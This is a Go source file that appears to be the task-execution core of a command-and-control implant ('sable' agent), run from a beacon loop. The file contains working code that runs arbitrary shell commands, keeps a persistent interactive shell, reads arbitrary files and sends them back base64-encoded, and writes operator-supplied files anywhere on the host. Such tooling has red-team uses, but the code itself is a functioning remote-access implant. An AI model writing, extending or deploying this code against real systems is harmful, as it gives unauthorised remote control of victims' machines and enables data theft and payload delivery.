package agent

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"github.com/aelder202/sable/internal/protocol"
)

const (
	shellTimeout        = 60 * time.Second
	maxShellOutputBytes = 512 * 1024       // 512 KB
	maxDownloadBytes    = 16 * 1024 * 1024 // 16 MB
)

// ptyShell is the persistent shell session used during interactive mode.
// It is lazily started on the first shell command and torn down on "interactive stop".
var ptyShell persistentShell

// executeTask dispatches a task to the appropriate handler and returns the result.
func executeTask(t *protocol.Task) *protocol.TaskResult {
	var output, taskErr string

	switch t.Type {
	case "shell":
		if atomic.LoadInt32(&interactiveMode) == 1 {
			// Use the persistent shell so cwd and environment persist across commands.
			output, taskErr = ptyShell.exec(t.Payload)
		} else {
			output, taskErr = runShell(t.Payload)
		}
	case "download":
		output, taskErr = downloadFile(t.Payload)
	case "upload":
		output, taskErr = uploadFile(t.Payload)
	case "interactive":
		if t.Payload == "start" {
			atomic.StoreInt32(&interactiveMode, 1)
			output = "interactive mode started"
		} else {
			atomic.StoreInt32(&interactiveMode, 0)
			ptyShell.close()
			output = "interactive mode stopped"
		}
	case "sleep":
		// sleep is handled in the beacon loop before executeTask is called
		output = "sleep acknowledged"
	case "kill":
		// kill causes the beacon loop to return after executeTask
		output = "terminating"
	default:
		taskErr = fmt.Sprintf("unknown task type: %q", t.Type)
	}

	return &protocol.TaskResult{TaskID: t.ID, Type: t.Type, Output: output, Error: taskErr}
}

// runShell executes a shell command and returns combined stdout/stderr.
// A 60-second deadline prevents runaway processes from blocking the beacon loop.
// Output is capped at maxShellOutputBytes to bound memory use.
func runShell(cmd string) (string, string) {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell, flag = "cmd", "/C"
	} else {
		shell, flag = "/bin/sh", "-c"
	}
	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
	defer cancel()
	out, err := exec.CommandContext(ctx, shell, flag, cmd).CombinedOutput()
	if len(out) > maxShellOutputBytes {
		out = out[:maxShellOutputBytes]
	}
	if err != nil {
		return string(out), err.Error()
	}
	return string(out), ""
}

// downloadFile reads a file from the agent filesystem and returns its base64-encoded contents.
// Files larger than maxDownloadBytes are rejected to prevent memory exhaustion.
func downloadFile(path string) (string, string) {
	info, err := os.Stat(path)
	if err != nil {
		return "", err.Error()
	}
	if info.Size() > maxDownloadBytes {
		return "", fmt.Sprintf("file too large: %d bytes (max %d)", info.Size(), maxDownloadBytes)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err.Error()
	}
	return base64.StdEncoding.EncodeToString(data), ""
}

// uploadFile writes base64-encoded data to a path on the agent filesystem.
// Payload format: "path:base64data"
func uploadFile(payload string) (string, string) {
	// LastIndexByte finds the separator between path and base64 data.
	// Base64 never contains ':', so the last ':' is always the delimiter.
	// This correctly handles Windows paths such as "C:\path\file.txt:data".
	idx := strings.LastIndexByte(payload, ':')
	if idx < 0 {
		return "", "invalid upload payload: missing ':' separator"
	}
	path := payload[:idx]
	b64data := payload[idx+1:]
	data, err := base64.StdEncoding.DecodeString(b64data)
	if err != nil {
		return "", fmt.Sprintf("base64 decode failed: %v", err)
	}
	if err := os.WriteFile(path, data, 0600); err != nil {
		return "", err.Error()
	}
	return fmt.Sprintf("wrote %d bytes to %s", len(data), path), ""
}
